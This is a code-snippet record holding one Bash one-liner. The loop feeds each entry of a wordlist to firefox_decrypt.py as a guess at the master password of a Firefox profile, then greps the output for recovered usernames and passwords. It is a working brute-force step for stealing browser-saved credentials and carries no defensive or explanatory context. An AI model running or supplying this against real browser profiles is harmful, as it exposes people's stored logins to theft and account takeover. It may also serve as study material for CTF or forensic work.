---
id: dd6dc83c-845d-48da-8edf-fea8e53c9631
type: code
language: Bash
verified: false
created_at: '2020-03-16T08:30:59.847621+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet dd6dc83c

**Language**: Bash

```bash
for guess in $(cat $WORDLIST); do echo $guess | python firefox_decrypt/firefox_decrypt.py .mozilla/firefox  2>&1 | grep 'Username:' -A 1; done
```


